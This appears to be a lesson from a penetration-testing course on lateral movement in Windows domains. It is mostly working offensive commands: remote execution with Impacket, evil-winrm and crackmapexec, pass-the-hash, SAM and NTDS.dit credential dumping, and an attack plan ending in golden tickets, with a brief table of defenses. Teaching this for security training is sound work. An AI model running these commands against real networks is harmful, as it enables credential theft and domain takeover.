# Lateral Movement Strategies

## Unit 9 - Topic 5 | Pivoting and Lateral Movement

---

## Overview

**Lateral movement** is the process of moving through a network after initial compromise, accessing additional systems to expand control, find sensitive data, and reach high-value targets like domain controllers. It's a critical phase between initial access and achieving objectives.

---

## 1. Lateral Movement Techniques

```
LATERAL MOVEMENT METHODS:

REMOTE EXECUTION:
├── PsExec — SMB service creation (port 445)
├── WMI — Windows Management Instrumentation
├── WinRM — Windows Remote Management (5985/5986)
├── SSH — Secure Shell (port 22)
├── DCOM — Distributed COM (port 135+)
├── Scheduled Tasks — at/schtasks
└── RDP — Remote Desktop (port 3389)

CREDENTIAL-BASED:
├── Pass-the-Hash (PtH) — Use NTLM hash
├── Pass-the-Ticket (PtT) — Use Kerberos ticket
├── Overpass-the-Hash — NTLM → Kerberos ticket
├── Credential Stuffing — Reuse found passwords
└── Token Impersonation — Steal access tokens

FILE-BASED:
├── SMB share access — Read/write shares
├── Admin shares — C$, ADMIN$, IPC$
├── WMI file transfer
└── PowerShell remoting file copy
```

---

## 2. Remote Execution Tools

```bash
# === PSEXEC (Impacket) ===
# Creates service on remote host → SYSTEM shell
impacket-psexec domain/admin:password@10.0.2.10
impacket-psexec domain/admin@10.0.2.10 -hashes :NTLM_HASH

# === WMIEXEC (Impacket) ===
# Uses WMI — no service created (stealthier)
impacket-wmiexec domain/admin:password@10.0.2.10
impacket-wmiexec domain/admin@10.0.2.10 -hashes :NTLM_HASH

# === SMBEXEC (Impacket) ===
# Service-based but uses cmd.exe
impacket-smbexec domain/admin:password@10.0.2.10

# === EVIL-WINRM ===
# WinRM (port 5985) — PowerShell remoting
evil-winrm -i 10.0.2.10 -u admin -p password
evil-winrm -i 10.0.2.10 -u admin -H NTLM_HASH

# === CRACKMAPEXEC (Test + Execute) ===
# Check access:
crackmapexec smb 10.0.2.0/24 -u admin -p password
# [+] 10.0.2.10  CORP\admin (Pwn3d!)

# Execute commands:
crackmapexec smb 10.0.2.10 -u admin -p password -x "whoami"
crackmapexec smb 10.0.2.10 -u admin -p password -X "Get-Process"

# Dump SAM:
crackmapexec smb 10.0.2.10 -u admin -p password --sam

# === POWERSHELL REMOTING ===
# From Windows:
Enter-PSSession -ComputerName SRV01 -Credential CORP\admin
Invoke-Command -ComputerName SRV01 -ScriptBlock {whoami}
```

---

## 3. Pass-the-Hash (PtH)

```bash
# === USE NTLM HASH WITHOUT CRACKING ===
# Hash format: LM:NTLM or just :NTLM

# PsExec:
impacket-psexec admin@10.0.2.10 -hashes :aad3b435b51404eeaad3b435b51404ee

# WMIExec:
impacket-wmiexec admin@10.0.2.10 -hashes :aad3b435b51404ee

# Evil-WinRM:
evil-winrm -i 10.0.2.10 -u admin -H aad3b435b51404ee

# CrackMapExec:
crackmapexec smb 10.0.2.0/24 -u admin -H aad3b435b51404ee

# RDP (Restricted Admin):
xfreerdp /u:admin /pth:aad3b435b51404ee /v:10.0.2.10

# === WHERE TO GET HASHES ===
# SAM dump (local admin):
hashdump          # Meterpreter
secretsdump.py domain/admin:pass@target  # Impacket
reg save HKLM\SAM sam.save   # Manual

# NTDS.dit dump (all domain users):
secretsdump.py domain/admin:pass@DC01
# Or: ntdsutil from DC
```

---

## 4. Lateral Movement Strategy

```
LATERAL MOVEMENT GAME PLAN:

1. ENUMERATE — Map the network
   ├── crackmapexec smb 10.0.2.0/24 (find live hosts)
   ├── BloodHound (map attack paths)
   └── Identify high-value targets (DC, file servers)

2. HARVEST CREDENTIALS
   ├── hashdump (local SAM)
   ├── Mimikatz (plaintext + tickets)
   ├── Responder (network hash capture)
   ├── Kerberoasting (service account hashes)
   └── Credential files (configs, scripts)

3. TEST ACCESS
   ├── crackmapexec smb TARGETS -u USER -p PASS
   ├── Check for (Pwn3d!) = admin access
   └── Map which creds work where

4. MOVE
   ├── psexec / wmiexec / evil-winrm
   ├── PtH if password unknown
   ├── Establish new session on target
   └── Repeat from step 2 on new host

5. ESCALATE
   ├── Find Domain Admin credentials
   ├── Access Domain Controller
   ├── Dump NTDS.dit (all domain hashes)
   └── Golden ticket for persistence
```

---

## 5. Detection and Defense

| Defense | How It Helps |
|---------|-------------|
| **Network segmentation** | Limits lateral movement scope |
| **Least privilege** | Admin only where needed |
| **LAPS** | Unique local admin password per host |
| **Credential Guard** | Protect credentials in memory |
| **Tiered admin model** | Separate admin accounts per tier |
| **SMB signing** | Prevent relay attacks |
| **Event monitoring** | Watch for 4624/4625 logon events |
| **EDR** | Detect PsExec, WMI, token theft |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Lateral movement** | Move between hosts after initial access |
| **PsExec** | SMB service-based remote execution |
| **WMIExec** | Stealthier WMI-based execution |
| **Pass-the-Hash** | Use NTLM hash without cracking |
| **CrackMapExec** | Swiss army knife for testing access |
| **Defense** | Segmentation, LAPS, credential guard |

---

## Quick Revision Questions

1. **What is the difference between pivoting and lateral movement?**
2. **Why is WMIExec considered stealthier than PsExec?**
3. **How does Pass-the-Hash work?**
4. **What does (Pwn3d!) mean in CrackMapExec output?**
5. **What is LAPS and how does it prevent lateral movement?**

---

[← Previous: SOCKS Proxies](04-socks-proxies.md) | [Next: Living Off the Land →](06-living-off-the-land.md)

---

*Unit 9 - Topic 5 of 6 | [Back to README](../README.md)*
